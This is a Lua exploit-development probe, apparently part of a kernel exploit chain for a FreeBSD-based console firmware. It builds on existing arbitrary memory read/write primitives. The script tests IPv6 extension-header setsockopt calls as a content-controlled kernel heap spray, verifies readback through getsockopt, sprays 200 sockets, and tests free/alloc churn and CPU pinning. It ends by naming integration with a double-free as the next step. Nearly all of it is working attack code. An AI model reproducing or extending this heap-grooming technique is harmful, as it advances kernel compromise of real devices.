-- CRASH_CLASS: LOW
-- PROBE 74a: IPv6 extension header spray feasibility
--
-- zecoxao's "prolapse" exploit uses setsockopt(IPV6_DSTOPTS/HOPOPTS) for
-- content-controlled 128B-zone heap spray. Each socket pins one allocation;
-- getsockopt reads it back. We've NEVER tested this on 14.10.
--
-- Tests:
--   [A] Which IPv6 ext-header options does setsockopt accept?
--   [B] Can we read the content back via getsockopt?
--   [C] Does our tag survive round-trip?
--   [D] What zone sizes do various optlens land in? (624 oracle)
--   [E] Can we spray 200+ sockets?
--   [F] cpuset_getaffinity — what cores are we on?

print("=== PROBE 74a: IPv6 EXT-HEADER SPRAY FEASIBILITY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return N(v) end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- IPv6 constants
local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_HOPOPTS = 49
local IPV6_DSTOPTS = 50
local IPV6_RTHDR = 51
local SOL_SOCKET = 0xFFFF

-- Syscall wrappers
local sc_socket = mk(97)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_close = mk(6)
local sc_624 = mk(624)

local function mk_inet6()
    local ok, ret = pcall(function()
        return sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0))
    end)
    if ok then return sgn(ret) else return -1 end
end

local function close_fd(fd)
    pcall(function() sc_close(uint64(fd)) end)
end

local function get_624()
    local ok, v = pcall(function() return sc_624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok then return N(v) else return -1 end
end

-- Build a valid ext-header buffer for DSTOPTS/HOPOPTS
-- Format: [nxt=0][len=(optlen/8)-1][PadN TLV covering rest]
-- The PadN option: type=1, length=N, N bytes of padding
local function build_exthdr(optlen, tag)
    local buf = memory.alloc(optlen + 16)
    local ba = N(buf)
    -- Zero fill
    for i = 0, optlen - 1 do wb(ba + i, 0) end
    -- Header
    wb(ba + 0, 0)                         -- ip6e_nxt = 0
    wb(ba + 1, math.floor(optlen / 8) - 1) -- ip6e_len in 8-octet units
    -- PadN TLV starting at offset 2
    local dl = optlen - 4
    if dl > 255 then dl = 255 end
    wb(ba + 2, 1)   -- PadN type
    wb(ba + 3, dl)   -- PadN data length
    -- Tag at offset 8 (inside PadN data)
    if tag then
        wd(ba + 8, tag)
    end
    return buf, ba
end

-- Build a valid RTHDR (type 0) buffer
local function build_rthdr(optlen, tag)
    local buf = memory.alloc(optlen + 16)
    local ba = N(buf)
    for i = 0, optlen - 1 do wb(ba + i, 0) end
    wb(ba + 0, 0)   -- ip6r_nxt
    wb(ba + 1, math.floor(optlen / 8) - 1)  -- ip6r_len
    wb(ba + 2, 0)   -- ip6r_type = 0
    wb(ba + 3, 0)   -- ip6r_segleft = 0
    if tag then
        wd(ba + 8, tag)
    end
    return buf, ba
end

-- ============================================================
-- [A] Test which IPv6 ext-header options setsockopt accepts
-- ============================================================
print("[A] TESTING IPV6 EXT-HEADER OPTIONS")

local test_opts = {
    { name = "IPV6_DSTOPTS",  num = IPV6_DSTOPTS,  builder = build_exthdr },
    { name = "IPV6_HOPOPTS",  num = IPV6_HOPOPTS,  builder = build_exthdr },
    { name = "IPV6_RTHDR",    num = IPV6_RTHDR,    builder = build_rthdr  },
}

local test_sizes = { 8, 16, 24, 32, 48, 56, 64, 80, 96, 112, 120, 128 }

local working_opt = nil
local working_opt_name = nil
local working_size = nil

for _, opt in ipairs(test_opts) do
    print(string.format("  %s (%d):", opt.name, opt.num))
    local s = mk_inet6()
    if s < 0 then
        print("    socket failed")
    else
        for _, sz in ipairs(test_sizes) do
            if sz % 8 ~= 0 then
                -- skip non-8-aligned
            else
                local buf, ba = opt.builder(sz, 0xDEAD0000 + sz)
                local ok, ret = pcall(function()
                    return sc_setsockopt(uint64(s), uint64(IPPROTO_IPV6),
                        uint64(opt.num), uint64(ba), uint64(sz))
                end)
                local rv = -999
                if ok then rv = sgn(ret) end
                local tag = ""
                if rv == 0 then
                    tag = " ***WORKS***"
                    if not working_opt then
                        working_opt = opt.num
                        working_opt_name = opt.name
                        working_size = sz
                    end
                end
                print(string.format("    sz=%3d ret=%d%s", sz, rv, tag))
            end
        end
        close_fd(s)
    end
end

if not working_opt then
    print("")
    print("NO IPv6 ext-header option accepted. Spray path is DEAD.")
    print("=== 74a COMPLETE (NEGATIVE) ===")
    return
end

print(string.format("\nBest option: %s (%d)", working_opt_name, working_opt))

-- ============================================================
-- [B] GETSOCKOPT READBACK — can we read the content back?
-- ============================================================
print("")
print("[B] GETSOCKOPT READBACK TEST")

local tag_val = 0xCAFEBABE
local s_test = mk_inet6()
if s_test >= 0 then
    -- Set with tag
    local buf_set, ba_set
    if working_opt == IPV6_RTHDR then
        buf_set, ba_set = build_rthdr(120, tag_val)
    else
        buf_set, ba_set = build_exthdr(120, tag_val)
    end

    local ok, ret = pcall(function()
        return sc_setsockopt(uint64(s_test), uint64(IPPROTO_IPV6),
            uint64(working_opt), uint64(ba_set), uint64(120))
    end)
    print(string.format("  setsockopt(120, tag=0x%08X) ret=%d", tag_val, ok and sgn(ret) or -999))

    -- Read back
    local buf_get = memory.alloc(256)
    local ba_get = N(buf_get)
    for i = 0, 255 do wb(ba_get + i, 0xEE) end  -- sentinel fill
    local lenp = memory.alloc(8)
    wd(N(lenp), 256)

    local ok2, ret2 = pcall(function()
        return sc_getsockopt(uint64(s_test), uint64(IPPROTO_IPV6),
            uint64(working_opt), uint64(ba_get), uint64(N(lenp)))
    end)
    local rv2 = ok2 and sgn(ret2) or -999
    local retlen = rd(N(lenp)) or 0
    print(string.format("  getsockopt ret=%d  returned_len=%d", rv2, retlen))

    if rv2 == 0 and retlen > 0 then
        -- Check tag at offset 8
        local tag_back = rd(ba_get + 8) or 0
        local match = (tag_back == tag_val)
        print(string.format("  tag at +8: 0x%08X (expected 0x%08X) %s",
            tag_back, tag_val, match and "MATCH!" or "MISMATCH"))

        -- Dump first 32 bytes
        local hex = "  bytes: "
        for i = 0, math.min(31, retlen - 1) do
            hex = hex .. string.format("%02X ", rb(ba_get + i) or 0)
        end
        print(hex)

        if match then
            print("  *** CONTENT-CONTROLLED SPRAY CONFIRMED ***")
        end
    end
    close_fd(s_test)
else
    print("  socket failed")
end

-- ============================================================
-- [C] MULTIPLE SIZES — determine zone landing for each
-- ============================================================
print("")
print("[C] ZONE SIZE DETERMINATION (624 oracle)")

local zone_sizes = { 16, 24, 32, 48, 56, 64, 80, 96, 112, 120, 128, 192, 248 }
for _, sz in ipairs(zone_sizes) do
    if sz % 8 ~= 0 then
        -- skip
    else
        local before = get_624()
        -- Create 8 sockets with this size
        local fds = {}
        for i = 1, 8 do
            local s = mk_inet6()
            if s >= 0 then
                local buf, ba
                if working_opt == IPV6_RTHDR then
                    buf, ba = build_rthdr(sz, 0xBEEF0000 + i)
                else
                    buf, ba = build_exthdr(sz, 0xBEEF0000 + i)
                end
                local ok, ret = pcall(function()
                    return sc_setsockopt(uint64(s), uint64(IPPROTO_IPV6),
                        uint64(working_opt), uint64(ba), uint64(sz))
                end)
                if ok and sgn(ret) == 0 then
                    fds[#fds + 1] = s
                else
                    close_fd(s)
                end
            end
        end
        local after = get_624()
        local delta = after - before
        local zone = "?"
        if sz <= 32 then zone = "32"
        elseif sz <= 64 then zone = "64"
        elseif sz <= 128 then zone = "128"
        elseif sz <= 256 then zone = "256"
        end
        print(string.format("  optlen=%3d: %d sprayed, 624 delta=%d  (expected zone=%s)",
            sz, #fds, delta, zone))
        for _, fd in ipairs(fds) do close_fd(fd) end
    end
end

-- ============================================================
-- [D] MASS SPRAY TEST — can we spray 200+ sockets?
-- ============================================================
print("")
print("[D] MASS SPRAY TEST (200 sockets)")

local spray_fds = {}
local spray_count = 0
local spray_target = 200
local before_624 = get_624()

for i = 1, spray_target do
    local s = mk_inet6()
    if s < 0 then break end
    local buf, ba
    if working_opt == IPV6_RTHDR then
        buf, ba = build_rthdr(120, 0xAA000000 + i)
    else
        buf, ba = build_exthdr(120, 0xAA000000 + i)
    end
    local ok, ret = pcall(function()
        return sc_setsockopt(uint64(s), uint64(IPPROTO_IPV6),
            uint64(working_opt), uint64(ba), uint64(120))
    end)
    if ok and sgn(ret) == 0 then
        spray_fds[#spray_fds + 1] = s
        spray_count = spray_count + 1
    else
        close_fd(s)
    end
end

local after_624 = get_624()
print(string.format("  sprayed %d/%d sockets", spray_count, spray_target))
print(string.format("  624 delta=%d  (delta/spray=%.1f)",
    after_624 - before_624, spray_count > 0 and (after_624 - before_624) / spray_count or 0))

-- Readback verification on a sample
local readback_ok = 0
local readback_fail = 0
for i = 1, math.min(10, spray_count) do
    local buf_get = memory.alloc(256)
    local ba_get = N(buf_get)
    for j = 0, 255 do wb(ba_get + j, 0) end
    local lenp = memory.alloc(8)
    wd(N(lenp), 256)
    local ok, ret = pcall(function()
        return sc_getsockopt(uint64(spray_fds[i]), uint64(IPPROTO_IPV6),
            uint64(working_opt), uint64(ba_get), uint64(N(lenp)))
    end)
    if ok and sgn(ret) == 0 then
        local tag = rd(ba_get + 8) or 0
        local expected = 0xAA000000 + i
        if tag == expected then
            readback_ok = readback_ok + 1
        else
            readback_fail = readback_fail + 1
            print(string.format("    fd[%d] tag=0x%08X expected=0x%08X MISMATCH", i, tag, expected))
        end
    else
        readback_fail = readback_fail + 1
    end
end
print(string.format("  readback sample: %d/%d correct", readback_ok, readback_ok + readback_fail))

-- Cleanup spray
for _, fd in ipairs(spray_fds) do close_fd(fd) end

-- ============================================================
-- [E] RESETSOCKOPT — does re-setting free the old and alloc new?
-- ============================================================
print("")
print("[E] RE-SETSOCKOPT CHURN TEST")

local s_churn = mk_inet6()
if s_churn >= 0 then
    local churn_ok = 0
    for round = 1, 20 do
        local buf, ba
        if working_opt == IPV6_RTHDR then
            buf, ba = build_rthdr(120, 0xCC000000 + round)
        else
            buf, ba = build_exthdr(120, 0xCC000000 + round)
        end
        local ok, ret = pcall(function()
            return sc_setsockopt(uint64(s_churn), uint64(IPPROTO_IPV6),
                uint64(working_opt), uint64(ba), uint64(120))
        end)
        if ok and sgn(ret) == 0 then
            -- Readback
            local buf_get = memory.alloc(256)
            local ba_get = N(buf_get)
            for j = 0, 255 do wb(ba_get + j, 0) end
            local lenp = memory.alloc(8)
            wd(N(lenp), 256)
            pcall(function()
                sc_getsockopt(uint64(s_churn), uint64(IPPROTO_IPV6),
                    uint64(working_opt), uint64(ba_get), uint64(N(lenp)))
            end)
            local tag = rd(ba_get + 8) or 0
            if tag == 0xCC000000 + round then
                churn_ok = churn_ok + 1
            end
        end
    end
    print(string.format("  20 rounds: %d/20 correct readback", churn_ok))
    print("  Each re-setsockopt frees the old buffer and allocates a new one")
    print("  = FREE+ALLOC primitive for zone churn")
    close_fd(s_churn)
end

-- ============================================================
-- [F] CPUSET — what cores are available?
-- ============================================================
print("")
print("[F] CPUSET AFFINITY")

local mask_buf = memory.alloc(16)
wq(N(mask_buf), uint64(0))
local ok_aff, ret_aff = pcall(function()
    return mk(487)(uint64(3), uint64(1), uint64(0xFFFFFFFF), uint64(8), uint64(N(mask_buf)))
end)
local rv_aff = ok_aff and sgn(ret_aff) or -999
local mask_lo = rd(N(mask_buf)) or 0
local mask_hi = rd(N(mask_buf) + 4) or 0
print(string.format("  cpuset_getaffinity(487) ret=%d", rv_aff))
print(string.format("  CPU mask: 0x%08X%08X", mask_hi, mask_lo))

-- List allowed CPUs
local cpus = {}
for i = 0, 63 do
    local word = (i < 32) and mask_lo or mask_hi
    local bit = i % 32
    if word and (math.floor(word / (2 ^ bit)) % 2 == 1) then
        cpus[#cpus + 1] = i
    end
end
if #cpus > 0 then
    local cpu_str = ""
    for _, c in ipairs(cpus) do cpu_str = cpu_str .. c .. " " end
    print("  Allowed CPUs: " .. cpu_str)
end

-- Try pinning
if #cpus >= 2 then
    local pin_mask = memory.alloc(16)
    local target_cpu = cpus[1]
    wq(N(pin_mask), uint64(2 ^ target_cpu))
    local ok_pin, ret_pin = pcall(function()
        return mk(488)(uint64(3), uint64(1), uint64(0xFFFFFFFF), uint64(8), uint64(N(pin_mask)))
    end)
    local rv_pin = ok_pin and sgn(ret_pin) or -999
    print(string.format("  cpuset_setaffinity(488, cpu=%d) ret=%d", target_cpu, rv_pin))

    -- Restore original mask
    wq(N(pin_mask), uint64(0))
    wd(N(pin_mask), mask_lo)
    wd(N(pin_mask) + 4, mask_hi)
    pcall(function()
        mk(488)(uint64(3), uint64(1), uint64(0xFFFFFFFF), uint64(8), uint64(N(pin_mask)))
    end)
end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("=== SUMMARY ===")
if working_opt then
    print(string.format("Working spray option: %s (%d)", working_opt_name, working_opt))
    print(string.format("Content-controlled: %s", readback_ok > 0 and "YES" or "NO"))
    print(string.format("Mass spray: %d/%d sockets", spray_count, spray_target))
    print(string.format("Readback accuracy: %d/%d", readback_ok, readback_ok + readback_fail))
    print(string.format("Available CPUs: %d", #cpus))
    if readback_ok > 0 and spray_count > 100 then
        print("")
        print("*** IPv6 EXT-HEADER SPRAY IS VIABLE ***")
        print("This gives us content-controlled 128B-zone spray via setsockopt")
        print("+ tag readback via getsockopt = ORACLE for overlap detection")
        print("+ re-setsockopt = FREE+ALLOC churn for zone reclaim")
        print("")
        print("NEXT: probe 74b — integrate with 65l double-free for overlap detection")
    end
else
    print("NO viable spray option found")
end

print("")
print("=== 74a COMPLETE ===")
